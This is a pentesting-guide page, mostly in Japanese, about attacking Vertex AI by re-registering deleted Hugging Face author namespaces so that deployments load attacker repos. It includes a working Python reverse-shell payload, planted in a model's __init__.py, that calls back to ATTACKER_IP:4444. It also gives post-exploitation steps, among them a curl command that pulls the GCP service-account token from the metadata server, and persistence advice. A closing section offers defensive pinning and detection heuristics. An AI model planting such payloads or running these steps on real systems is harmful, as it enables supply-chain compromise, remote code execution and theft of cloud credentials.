# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## シナリオ

- Vertex AI Model Garden は多くの Hugging Face (HF) モデルを直接デプロイできます。
- HF のモデル識別子は Author/ModelName です。HF 上の author/org が削除されると、同じ author 名は誰でも再登録できます。攻撃者はその後、同じ ModelName を持つ repo をレガシーなパスに作成できます。
- 名前だけで取得する（pinning/integrity がない）Pipelines、SDKs、またはクラウドカタログは攻撃者がコントロールする repo を取得します。モデルがデプロイされると、その repo のローダーコードが Vertex AI endpoint コンテナ内で実行され、エンドポイントの権限で RCE を引き起こす可能性があります。

HF での一般的な乗っ取りケースは 2 つあります:
- Ownership deletion: 旧パスは、誰かが author を再登録して同じ ModelName を公開するまで 404 を返します。
- Ownership transfer: HF は旧 Author/ModelName から新しい author へ 307 リダイレクトを発行します。もし旧 author が後に削除され攻撃者によって再登録された場合、リダイレクトチェーンは切断され、攻撃者の repo がレガシーパスで応答します。

## 再利用可能なネームスペースの特定 (HF)

- Old author deleted: author のページが 404 を返す; モデルのパスは乗っ取りまで 404 を返す場合があります。
- Transferred models: 旧モデルパスは旧 author が存在する間、新しい所有者へ 307 を発行します。もし旧 author が後に削除され再登録されると、レガシーパスは攻撃者の repo を指すようになります。

curl を使った簡易チェック:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## Vertex AI に対するエンドツーエンドの攻撃フロー

1) Model Garden が deployable として一覧表示している、再利用可能なモデル名前空間を発見する:
- Vertex AI Model Garden にある、まだ “verified deployable” と表示されている HF モデルを見つける。
- HF 上で元の author が削除されているか、またはモデルが移管されて古い author が後で削除されたかを確認する。

2) HF 上で削除された author を再登録し、同じ ModelName を再作成する。

3) 悪意のある repo を公開する。モデルのロード時に実行されるコードを含める。HF のモデルロード時によく実行される例:
- repo の __init__.py における副作用
- config/auto_map で参照されるカスタムの modeling_*.py や処理コード
- Transformers の pipelines で trust_remote_code=True を要求するコードパス

4) 以前の Author/ModelName を使った Vertex AI のデプロイが攻撃者の repo をプルする。ローダーは Vertex AI endpoint コンテナ内で実行される。

5) ペイロードは endpoint 環境から（RCE）エンドポイントの権限でアクセスを確立する。

Example payload fragment executed on import (for demonstration only):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
メモ
- 実際の loaders は様々です。多くの Vertex AI HF integrations はモデル’s config で参照されるリポジトリモジュールをクローンしてインポートします（例: auto_map）。これがコード実行を引き起こす可能性があります。使用によっては trust_remote_code=True が必要です。
- endpoint は通常、限定されたスコープの専用コンテナで動作しますが、GCP 内でデータアクセスや横移動のための有効な初期足掛かりとなり得ます。

## Post-Exploitation Tips (Vertex AI Endpoint)

コードが endpoint コンテナ内で実行されている場合は、以下を検討してください:
- 資格情報／トークンを得るために環境変数やメタデータを列挙する
- アタッチされたストレージやマウントされたモデルアーティファクトにアクセスする
- サービスアカウントのアイデンティティを介して Google APIs（Document AI, Storage, Pub/Sub など）とやり取りする
- プラットフォームがリポジトリを再取得する場合に備えて、モデルアーティファクト内に永続化を置く

アクセス可能ならインスタンスのメタデータを列挙する（コンテナ依存）:
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Vertex AI ユーザー向け防御ガイダンス

- HF loaders で commit によってモデルを固定し、知らないうちに差し替えられるのを防ぐ:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- 検証済みの HF models を信頼できる社内の artifact store/registry にミラーし、そこからデプロイする。
- コードベースや設定を継続的にスキャンし、削除／移管された Author/ModelName がハードコードされていないか確認する。新しい名前空間に更新するか、コミットで pin する。
- Model Garden では、デプロイ前にモデルの出所と著者の存在を確認する。

## 検出ヒューリスティクス (HTTP)

- Deleted author: 著者ページが 404。レガシーモデルのパスも乗っ取りが起こるまで 404。
- Transferred model: レガシーパスが 307 で新しい著者へリダイレクトされる（旧著者が存在する間）；もし旧著者が後に削除され再登録されると、レガシーパスが攻撃者のコンテンツを配信する。
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## 相互参照

- より広範な方法論とサプライチェーンに関する注意事項を参照してください：

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## 参考文献

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
